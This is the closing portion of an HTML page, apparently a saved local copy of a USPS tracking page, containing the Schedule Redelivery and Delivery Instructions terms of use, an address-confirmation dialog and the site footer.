						<div id="modalLabel2" style="display: none;"></div>
						<div class="modal-body tool_tip_text">
							<h4 class="modal-header">Terms and Conditions of Use for
								Schedule Redelivery</h4>
							<div class="modal-body">
								<p>The person who prepares this form states that he or she is
									the person, executor, guardian, authorized officer, or agent of
									the person for whom mail would be redelivered under this order.
									Anyone submitting false or inaccurate information on this form is
									subject to punishment by fine or imprisonment or both under
									Sections 2, 1001, 1702 and 1708 of Title 18, United States Code.</p>
							</div>
						</div>
						<a tabindex="0" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="closeX" role="button" aria-label="Close modal" data-dismiss="modal">
							<span class="icon-cancel" aria-hidden="true"></span>
						</a>
					</div>
				</div>
			</div>

			<div class="modal fade" id="modalDeliveryInstructionsTerms" tabindex="-1" role="dialog" aria-labelledby="modalLabel1">
				<div class="modal-dialog" role="document">
					<div class="modal-content">
						<div id="modalLabel1" style="display: none;"></div>
						<div class="modal-body tool_tip_text">
							<h4 class="modal-header">Terms and Conditions of Use for
								USPS.com Delivery Instructions</h4>
							<div class="modal-body">
								<p>
									This Terms of Use Agreement (this "Agreement") is a legal
									agreement between you ("You" "Your" or "User") and the United
									States Postal Service®, an Independent Establishment of the
									Executive Branch of the United States Federal Government ("USPS<sup>®</sup>"
									or "Postal Service"). The Agreement sets forth the terms and
									conditions for Your use of the USPS.com Delivery Instructions
									that allows You to electronically request that certain types of
									United States Postal Service package(s) be left at the address of
									delivery without You being present to accept the package
									authorized for release ("Delivery Instructions" or ("Service")).
									The Service also allows You to redirect Your package to a
									different address with the potential of having additional postage
									charged for a change in delivery location. This Agreement is
									between You and USPS only, and not with any other entity. USPS is
									solely responsible for the services, content and materials
									provided through usps.com and the Service generally. User
									acknowledges and agrees that he or she is solely responsible for
									and shall abide by (i) the terms of this Agreement; (ii) the
									terms of use and guidelines of all secondary website, services
									and devices affiliated with the Service, as applicable, or linked
									to through the Service; and (iii) all policies, procedures and
									regulations of the United States Postal Service, which shall
									include and not be limited to the requirements of the USPS
									Domestic Mail Manual. User warrants, represents and agrees that
									interaction with the Service is for the sole purpose to
									facilitate a shipping transaction.
								</p>
								<p>
									<strong>Modification of These Terms of Use</strong>
								</p>
								<p>
									The Postal Service reserves the right to change the terms,
									conditions, and notices under which the Delivery Instructions are
									offered. You may review the most current terms and conditions of
									use at <a href="https://www.usps.com/tracking/easr-terms-and-conditions-popup.htm">https://www.usps.com/tracking/easr-terms-and-conditions-popup.htm</a>.
									If You do not agree to, or cannot comply with, the Agreement as
									amended, You must stop using the Service. You will be deemed to
									have accepted the Agreement as amended if You continue to use the
									Service. User acknowledges and agrees that his or her use of the
									Service, in each instance, is subject to any such changes and
									that User's use of the Service constitutes acceptance of such
									changed terms. User agrees to review this Agreement from time to
									time to ensure compliance with these terms and conditions, but at
									a minimum, in each instance that You request a release through
									Delivery Instructions.
								</p>
								<p>
									<strong>Description of Service</strong>
								</p>
								<p>
									The Service is an online platform designed to allow You to
									authorize the USPS to release Your package for delivery at an
									address that You would be authorized to receive such package. The
									Service is not available for packages insured for over $200 or
									registered packages or those requiring signatures. This online
									Service provides the same shipment release option You would have
									at Post Office<sup>™</sup> locations by filling out Postal
									Service Form PS 3849 entitled, "Delivery
									Notice/Reminder/Receipt." This service is free of charge for
									packages released to Your address or a neighbors address, but
									there is no guarantee that the letter carrier will receive the
									instructions You provide in a timely manner that would allow the
									release of Your package or that Your instructions will be
									followed. Alternate delivery locations such as Your back door or
									front porch can be requested if a package will not fit in Your
									mailbox. The Service also allows You to redirect Your package to
									a different address, and allows You to upgrade the service to
									premium delivery services such as Priority Mail or Priority Mail
									Express or to add applicable extra services if so desired. In
									such instance where You redirect Your package to a different
									address or upgrade delivery options, the USPS will provide an
									estimate of postage during checkout; however, the estimate may
									not be accurate due to various constraints. Actual postage to the
									changed address is determined after the package is intercepted,
									weighed, rated and any service upgrades are applied . Your
									package will be sent to its original destination if the payment
									fails at the time the package is intercepted. Should the actual
									postage amount exceed the estimate, Your credit card will not be
									charged, but the package will arrive to its alternative
									destination Postage Due. Such payment must be made with cash,
									check or money order. Any package that is received damaged will
									be delivered as addressed.
								</p>
								<p>
									<strong>Functionality not Guaranteed</strong>
								</p>
								<p>You acknowledge that functionality of the Service may be
									compromised or unavailable based on the configuration of Your
									system based on Your operating system, browser version as well as
									Your hardware or phone. Access to the Service is not guaranteed
									for every software and hardware configuration, and You agree that
									the Postal Service shall have no liability for Your inability to
									access My USPS.com in every instance, or to access the various
									services available through My USPS.com due to such hardware and
									software constraints.</p>
								<p>
									<strong>Privacy </strong>
								</p>
								<p>For over two centuries, the Postal Service has valued Your
									privacy, and built a brand that customers trust. When using the
									Service, the information You provide is accessible to the Postal
									Service, but may also be collected by third parties such as the
									companies that control the operating systems of the particular
									application You are using, e.g. browser, mobile device, etc. as
									well as Your telecommunications provider (not unlike an Internet
									Service Provider's ability to access data provided by its
									subscribers). Information collected by any such third party is
									governed by its terms of service and its privacy policy. Any
									information provided by You to the Postal Service while utilizing
									the Service is governed by the USPS privacy policy.</p>
								<p>
									For information about our privacy policy, please visit <a href="http://www.usps.com/privacypolicy">www.usps.com/privacypolicy</a>.
								</p>
								<p>
									<strong>Intellectual Property - License Grant and
										Restrictions </strong>
								</p>
								<p>This Service provided to You by the USPS is for User's
									personal use. User may not modify, copy, distribute, transmit,
									display, perform, reproduce, publish, license, create derivative
									works from, transfer, or sell any information, software,
									products, or services obtained from the Service. Material
									provided by the Service is the copyrighted property of the Postal
									Service. All rights reserved. The intellectual property and
									images presented through the Service may not under any
									circumstances be reproduced or used without USPS's prior written
									permission. Other than the actual information related to Your
									mailed item, You may view and download material from this Service
									(i) for personal; (ii) where the materials clearly state that
									these materials may be copied and reproduced according to the
									terms stated in those particular pages; or (iii) with the express
									written permission of the Postal Service. In all other cases, You
									will need written permission from the Postal Service to
									reproduce, republish, upload, post, transmit, distribute or
									publicly display material from this Service.</p>
								<p>USPS grants to You a limited, non-exclusive,
									non-transferable license to access and use the Service for
									personal use only. USPS also grants to You a non-exclusive,
									non-transferable license to use the Service on any device that
									You own or control as permitted by any terms of use set forth by
									Your device manufacturer, the terms of use of Your device's
									operating system and/or the terms of use of Your
									telecommunications provider. Any violation by You of the license
									provisions contained herein may result in the immediate
									termination of Your right to use the Service. USPS reserves all
									right, title and interest not expressly granted under this
									license to the fullest extent possible under applicable laws. ANY
									USE OF THE SERVICE NOT SPECIFICALLY PERMITTED UNDER THIS
									AGREEMENT IS STRICTLY PROHIBITED.</p>
								<p>You agree that You will not:</p>
								<ul>
									<li>use the Service or usps.com to reproduce copyrighted
										materials;</li>
									<li>copy, store, edit, change, prepare any derivative work
										of or alter in any way any of the information provided through
										the Service or usps.com except for uses related to Your personal
										mailing and purchase of USPS products and services;</li>
									<li>provide Your password, if required by the Service or any
										Application available on usps.com to any other person;</li>
									<li>translate, reverse engineer, decompile, disassemble,
										modify or create derivative works based on the Service or any
										Application available on usps.com or any portion of them
										accessible through the Service or through usps.com;</li>
									<li>circumvent any technology used by the USPS or its
										licensors to protect content accessible via the Service or found
										on usps.com;</li>
									<li>rent, lease or sublicense any of the intellectual
										property provided through the Service or available on usps.com;
										or</li>
									<li>use the Service or any Application available on usps.com
										in any way that violates the terms of this Agreement.</li>
								</ul>
								<p>As between You and USPS, You acknowledge that USPS owns or
									has a license to all title and copyrights in and to the Service.
									All title and intellectual property rights in and to the content
									in the Service is the property of the respective content owner
									(whether the USPS or a licensor to the USPS) and may be protected
									by applicable copyright or other intellectual property laws and
									treaties and subject to use restrictions under such laws or
									treaties.</p>
								<p>The Service contains the trademarks, service marks,
									graphics and logos of the USPS and may contain third-party
									trademarks, service marks, graphics, and logos. You are not
									granted any right or license with respect to such USPS trademarks
									or the trademarks of any third party.</p>
								<p>
									<strong>Updates, Maintenance and Support </strong>
								</p>
								<p>
									USPS may from time to time make available to all users of the
									Service updates at no cost or subject to additional fees in
									USPS's sole discretion. "Updates" means any updates, upgrades or
									error corrections to the Service USPS makes available generally
									to users of the Service. Notwithstanding anything else contained
									in this Agreement, USPS will have no obligation to continue
									producing or releasing new versions of the Service or any updates
									thereto. USPS is solely responsible for providing any maintenance
									and support of the Service as specified in this Agreement, or as
									required under applicable law.
								</p>
								<p>
									<strong>Links to Third-Party Sites and Limitation of
										Liability </strong>
								</p>
								<p>The Service and other websites and services that may be
									accessible through the Service or on usps.com generally, which
									also may be operated by the Postal Service, may contain links to
									websites operated by parties other than the Postal Service. Such
									links are provided solely for User's convenience. The Postal
									Service does not control such third-party websites and is not
									responsible for the contents of such sites. The Postal Service's
									inclusion, if any, of links to such third-party websites does not
									imply any endorsement of the material on such sites or any
									association with their operators. When linking to such
									third-party websites, the Postal Service follows web-linking and
									exit page guidelines as set forth in USPS Management Instruction
									AS-610-2012-3. The Postal Service does not monitor websites
									linked to by User, and the use of any such links is performed
									strictly at the User's own risk. IN NO EVENT SHALL THE POSTAL
									SERVICE BE LIABLE FOR ANY DAMAGES THAT RESULT FROM ACTIVITY
									OCCURRING ON NON-POSTAL SERVICE WEBSITES WHEN A USER LINKS TO
									SUCH SITE FROM THE SERVICE OR USPS.COM.</p>
								<p>
									<strong>No Unlawful or Prohibited Use </strong>
								</p>
								<p>As a condition of Your use of this Service, You warrant to
									the Postal Service that You will not use the Service or usps.com
									for any purpose that is unlawful or prohibited by these Terms of
									Use.</p>
								<p>User agrees that when using the Service or usps.com that
									User shall not:</p>
								<ul>
									<li>Defame, abuse, harass, stalk, threaten or otherwise
										violate the legal rights (such as rights of privacy and
										publicity) of others;</li>
									<li>Publish, post, upload, distribute or disseminate any
										inappropriate, profane, defamatory, infringing, obscene,
										indecent or unlawful topic, name, material or information;</li>
									<li>Upload files that contain software or other material
										protected by intellectual property laws (or by rights of privacy
										of publicity) unless You own or control the rights thereto or
										have received all necessary consents;</li>
									<li>Upload files that contain viruses, corrupted files, or
										any other similar software or programs that may damage the
										operation of another's computer;</li>
									<li>Advertise or offer to sell any goods or services for any
										commercial purpose;</li>
									<li>Conduct or forward surveys, promotions, sweepstakes,
										contests, pyramid schemes or chain letters;</li>
									<li>Download any file posted by another user of the Service
										that User knows, or reasonably should know, cannot be legally
										distributed in such manner;</li>
									<li>Falsify or delete any author attributions, legal or
										other proper notices or proprietary designations or labels of
										the origin or source of software or other material contained in
										a file that is uploaded; or</li>
									<li>Restrict or inhibit any other user from using and
										enjoying the Service or usps.com generally.
									</li>
								</ul>
								<p>The Postal Service reserves the right to terminate User's
									access to the Service at any time without notice for any reason
									whatsoever.</p>
								<p>The Postal Service reserves the right at all times to
									disclose any information as necessary to satisfy any applicable
									law, regulation, legal process or governmental request, or to
									edit, refuse to post or to remove any information or materials,
									in whole or in part, in the Postal Service's sole discretion.</p>
								<p>User grants the Postal Service permission to use any
									information, suggestions, ideas, drawings or concepts
									communicated for any purpose by You to the Postal Service in any
									manner that the Postal Service chooses, commercial, public or
									otherwise, without compensation whatsoever. User agrees and
									acknowledges that all content provided within the Service or
									thorough usps.com generally, whether provided by the Postal
									Service, third-parties or from User, to the fullest extent
									permitted by law and under contract, shall be or become the
									property of the United States Postal Service with no restrictions
									in use, whether commercial or otherwise.</p>
								<p>
									<strong>Liability Disclaimer </strong>
								</p>
								<p>The information, software if any, products, and services
									included through this Service may include inaccuracies or
									typographical errors. Changes are periodically added to the
									information provided. The Postal Service and/or its respective
									suppliers may make improvements and/or changes to this Service
									and the Applications at any time.</p>
								<p>THE MATERIALS AND/OR INFORMATION PROVIDED UTILIZING THE
									SERVICE ARE PROVIDED "AS IS" AND WITHOUT WARRANTIES OF ANY KIND
									EITHER EXPRESS OR IMPLIED TO THE FULLEST EXTENT PERMITTED
									PURSUANT TO APPLICABLE LAW. THE POSTAL SERVICE DISCLAIMS ALL
									WARRANTIES, EXPRESS OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
									IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
									PARTICULAR PURPOSE. THE POSTAL SERVICE DOES NOT WARRANT OR
									REPRESENT THAT THE INFORMATION IS ACCURATE OR RELIABLE OR THAT,
									THE MATERIALS AND/OR INFORMATION PROVIDED UTILIZING THE SERVICE
									OR USPS.COM WILL BE FREE OF ERRORS OR VIRUSES. IF YOU ARE
									DISSATISFIED WITH ANY PORTION OF THIS SERVICE OR USPS.COM, OR
									WITH ANY OF THESE TERMS OF USE, USER'S SOLE AND EXCLUSIVE REMEDY
									IS TO DISCONTINUE USING THE SERVICE OR USPS.COM. TO THE FULLEST
									EXTENT PERMITTED BY APPLICABLE LAW, UNDER NO CIRCUMSTANCES,
									INCLUDING BUT NOT LIMITED TO NEGLIGENCE, WILL THE POSTAL SERVICE
									BE LIABLE FOR DIRECT, SPECIAL, INDIRECT, EXEMPLARY, INCIDENTAL,
									PUNITIVE OR CONSEQUENTIAL DAMAGES THAT RESULT FROM OR RELATE TO
									THE USE OR INABILITY TO USE THE MATERIALS AND/OR INFORMATION
									PROVIDED UTILIZING THE SERVICE OR THE APPLICATIONS, EVEN IF THE
									POSTAL SERVICE HAS BEEN ADVISED OF THE POSSIBLITY OF SUCH
									DAMAGES. FOR THE AVOIDANCE OF DOUBT, IN NO EVENT SHALL THE POSTAL
									SERVICE BE LIABLE FOR ANY DAMAGES RESULTING FROM USER'S INABILITY
									TO ACCESS OR USE THE SERVICE, USPS.COM, MATERIALS AND/OR
									INFORMATION PROVIDED UTILIZING THE SERVICE OR USPS.COM DUE TO
									FAILURE OF THE USER'S DEVICE, OPERATING SYSTEM OR USER'S
									INABILITY TO ACCESS SUFFICIENT BANDWIDTH AND/OR
									TELECOMMUNICATIONS CONNECTIVITY. YOU ACKNOWLEDGE AND AGREE THAT
									YOUR TELECOMMUNICATIONS CARRIER MAY CHARGE DATA USAGE FEES
									(INCLUDING ADDITIONAL CHARGES WHEN ROAMING) TO ACCESS THE
									SERVICE, AND THAT THE POSTAL SERVICE SHALL NOT BE LIABLE FOR ANY
									SUCH FEES AS A RESULT OF YOUR USE OF THE APPLICATION OR THE
									SERVICE. YOU SHOULD CONTACT YOUR WIRELESS OR TELECOMMUNICATIONS
									PROVIDER FOR COMPLETE PRICING DETAILS.</p>
								<p>
									<strong>Indemnification </strong>
								</p>
								<p>You acknowledge and agree to indemnify and hold the Postal
									Service, its affiliates, officers, employees and agents,
									harmless, including costs and attorneys' fees, from any claim or
									demand made by any third party due to or arising out of Your use
									of the Service or in the event of Your violation of this
									Agreement, any infringement of third party rights by You while
									utilizing the Service or usps.com, of any intellectual property
									or other right of any person or entity or arising out of or
									related to any products or services purchased by You in
									connection with the Service or usps.com offered by a third party.
								</p>
								<p>
									<strong>Access Restriction and Registration </strong>
								</p>
								<p>The Postal Service, in its sole and unreviewable
									discretion, reserves the right to deny any User access to the
									Service, the applications or any portion of usps.com without
									notice. You must register for this Service, and by doing so, You
									warrant and represent that You have the authority to request the
									functions performed through the Service. You agree not to use the
									Service to solicit information regarding any shipments of which
									You are not either the bona fide recipient or sender.</p>
								<p>
									<strong>General </strong>
								</p>
								<p>THIS AGREEMENT IS GOVERNED BY UNITED STATES FEDERAL LAW.
									USER AGREES THAT ALL DISPUTES AND MATTERS WHATSOEVER ARISING
									UNDER, IN CONNECTION WITH OR INCIDENT TO THESE TERMS OF USE SHALL
									BE BROUGHT BY USER IN AND BEFORE A FEDERAL COURT LOCATED IN THE
									DISTRICT OF COLUMBIA (EXCLUDING RIGHTFUL ACTIONS BROUGHT BEFORE
									THE UNITED STATES POSTAL SERVICE BOARD OF CONTRACT APPEALS), TO
									THE EXCLUSION OF THE COURTS OF ANY OTHER STATE OR COUNTRY. USER
									AGREES TO WAIVE ANY OBJECTIONS AS TO THE LAYING OF PERSONAL
									JURISDICTION OR VENUE IN SUCH A COURT, AND AS TO ANY PURPORTED
									INCONVENIENCE OF THE CHOSEN FORUM.</p>
								<p>The Postal Service's performance of this Agreement is
									subject to existing laws and legal processes, and nothing
									contained in this Agreement is in derogation of the Postal
									Service's right to comply with governmental, court and law
									enforcement requests or requirements relating to Your use of this
									Service or information provided to or gathered by the Postal
									Service with respect to such use. If any part of this Agreement
									is determined to be invalid or unenforceable pursuant to
									applicable law including, but not limited to, the warranty
									disclaimers and liability limitations set forth above, then the
									invalid or unenforceable provision will be deemed superseded by a
									valid, enforceable provision that most closely matches the intent
									of the original provision and the remainder of the Agreement
									shall continue in effect.</p>
								<p>This Agreement constitutes the entire Agreement between the
									User and the Postal Service with respect to this Service and it
									supersedes all prior or contemporaneous communications and
									proposals, whether electronic, oral or written, between the User
									and the Postal Service with respect to this Service. A printed
									version of this Agreement and of any notice given in electronic
									form shall be admissible in judicial or administrative
									proceedings based upon or relating to this Agreement to the same
									extent and subject to the same conditions as other business
									documents and records originally generated and maintained in
									printed form.</p>
								<p>Updated: 02/20/2015</p>
							</div>
						</div>
						<a tabindex="0" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="closeX" role="button" aria-label="Close modal" data-dismiss="modal">
							<span class="icon-cancel" aria-hidden="true"></span>
						</a>
					</div>
				</div>
			</div>

			<!-- START CHECK AVAILABILITY MODAL -->
			<div class="modal fade" id="checkAvailabilityModal" role="dialog" style="display: none;">
				<div class="modal-dialog">
					<div class="modal-content modal-container checkAvailabilityModal">
						<div class="modal-header">
							<button type="button" class="step-one-close close" data-dismiss="modal"></button>
							<h4 class="step-one-modal-title modal-title">Please choose a
								valid USPS address that matches the one you entered.</h4>
						</div>
						<div class="step-one-modal-body modal-body">
							<div class="row">
								<div class="col-md-12 col-sm-12 col-xs-12 form-group">
									<p class="step-one-modal-sub sub-header">
										<strong>Your address as you entered it:</strong>
									</p>
								</div>
								<div class="col-md-12 col-sm-12 col-xs-12 form-group street-num-name street-num-name">
									<p id="enteredAddress">123 BROAD ST</p>
									<p id="enteredCityStateZip">BROOKLYN NY 11206-1234</p>
								</div>
								<div class="col-md-12 col-sm-12 col-xs-12 mobile-modal step-one-modal-line horizontal-line-container">
									<hr class="horizontal-line">
								</div>
								<div class="col-md-12 col-sm-12 col-xs-12 form-group sub-header-container">
									<p class="step-one-modal-sub sub-header">
										<strong>Choose one of the addresses we found:</strong>
									</p>
								</div>
								<div class="found-addresses required-field">
									<div class="pick-valid-address step-one-radio-wrap radio-wrap mobile-modal" id="pickaPlace"></div>
									<span class="error-message selectAddressError" style="display: none;">Please select one of the addresses
										found.</span>
								</div>
								<div class="col-md-12 col-sm-12 col-xs-12 buttons-holder">
									<div class="button-container">
										<a role="button" class="btn-primary use-selected-address">Use
											Selected Address</a>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- END CHECK AVAILABILITY MODAL -->


			<!---  GLOBAL FOOTER - FOR REFRERENCE ONLY -->
			<!-- <script src="http://www.w3schools.com/lib/w3data.js"></script> -->

			<div id="global-footer--wrap" class="global-footer--wrap">
				<link type="text/css" rel="stylesheet" href="./index_files/main-sb.css">
				<link type="text/css" rel="stylesheet" href="./index_files/footer-sb.css">

				<!--[if lte IE 8]>
			<link href="/global-elements/footer/css/main.ie.sb.css" rel="stylesheet" type="text/css" />
			<link href="/global-elements/footer/css/footer.ie.sb.css" rel="stylesheet" type="text/css" />
			<![endif]-->

				<script type="text/javascript">
					var MTIProjectId='f3e4655b-fd06-4b8b-8a25-01c859692612';
							(function() {
								var mtiTracking = document.createElement('script');
								mtiTracking.type='text/javascript';
								mtiTracking.async='true';
								mtiTracking.src=('https:'==document.location.protocol?'https:':'http:')+'//fast.fonts.net/t/trackingCode.js';
								(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild( mtiTracking );
							})();
				</script>
				<footer class="global-footer">
					<a href="https://www.usps.com/" class="global-footer--logo-link"></a>
					<nav class="global-footer--navigation">
						<ol>
							<li style="color:#333366;" class="global-footer--navigation-category">
								Helpful Links
								<ol class="global-footer--navigation-options">
									<li>
										<a href="https://www.usps.com/help/contact-us.htm">Contact Us</a>
									</li>
									<li>
										<a href="https://www.usps.com/globals/site-index.htm">Site Index</a>
									</li>
									<li>
										<a href="https://faq.usps.com/s/">FAQs</a>
									</li>
									<li>
										<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" onclick="KAMPYLE_ONSITE_SDK.showForm(244)">Feedback</a>
									</li>
								</ol>
							</li>
							<li style="color:#333366;" class="global-footer--navigation-category">
								On About.USPS.com
								<ol class="global-footer--navigation-options">
									<li>
										<a href="https://about.usps.com/">About USPS Home</a>
									</li>
									<li>
										<a href="https://about.usps.com/newsroom/">Newsroom</a>
									</li>
									<li>
										<a href="https://about.usps.com/newsroom/service-alerts/">USPS Service Updates</a>
									</li>
									<li>
										<a href="https://about.usps.com/resources/">Forms &amp; Publications</a>
									</li>
									<li>
										<a href="https://about.usps.com/what/government-services/">Government Services</a>
									</li>
									<li>
										<a href="https://about.usps.com/careers/">Careers</a>
									</li>
								</ol>
							</li>
							<li style="color:#333366;" class="global-footer--navigation-category">
								Other USPS Sites
								<ol class="global-footer--navigation-options">
									<li>
										<a href="https://gateway.usps.com/">Business Customer Gateway</a>
									</li>
									<li>
										<a href="https://www.uspis.gov/">Postal Inspectors</a>
									</li>
									<li>
										<a href="https://www.uspsoig.gov/">Inspector General</a>
									</li>
									<li>
										<a href="https://pe.usps.com/">Postal Explorer</a>
									</li>
									<li>
										<a href="https://postalmuseum.si.edu/">National Postal Museum</a>
									</li>
									<li>
										<a href="https://www.usps.com/business/web-tools-apis/">Resources for Developers</a>
									</li>
								</ol>
							</li>
							<li style="color:#333366;" class="global-footer--navigation-category">
								Legal Information
								<ol class="global-footer--navigation-options">
									<li>
										<a href="https://about.usps.com/who/legal/privacy-policy/">Privacy Policy</a>
									</li>
									<li>
										<a href="https://about.usps.com/who/legal/terms-of-use.htm">Terms of Use</a>
									</li>
									<li>
										<a href="https://about.usps.com/who/legal/foia/">FOIA</a>
									</li>
									<li>
										<a href="https://about.usps.com/who/legal/no-fear-act/">No FEAR Act/EEO Contacts</a>
									</li>
								</ol>
							</li>
						</ol>
					</nav>

					<div class="global-footer--copyright">Copyright © <script type="text/javascript">
							document.write(new Date().getFullYear());
						</script> USPS. All Rights Reserved.</div>


					<ul class="global-footer--social">
						<li>
							<a style="text-decoration: none;" href="https://www.facebook.com/USPS?rf=108501355848630">
								<img alt="Image of Facebook social media icon." src="./index_files/social-facebook_1.png">
							</a>
						</li>
						<li>
							<a style="text-decoration: none;" href="https://twitter.com/usps">
								<img alt="Image of Twitter social media icon." src="./index_files/social-twitter_2.png">
							</a>
						</li>
						<li>
							<a style="text-decoration: none;" href="http://www.pinterest.com/uspsstamps/">
								<img alt="Image of Pinterest social media icon." src="./index_files/social-pinterest_6.png">
							</a>
						</li>
						<li>
							<a style="text-decoration: none;" href="https://www.youtube.com/usps">
								<img alt="Image of Youtube social media icon." src="./index_files/social-youtube_3.png">
							</a>
						</li>
					</ul>

				</footer>
			</div>


	</body>
</html>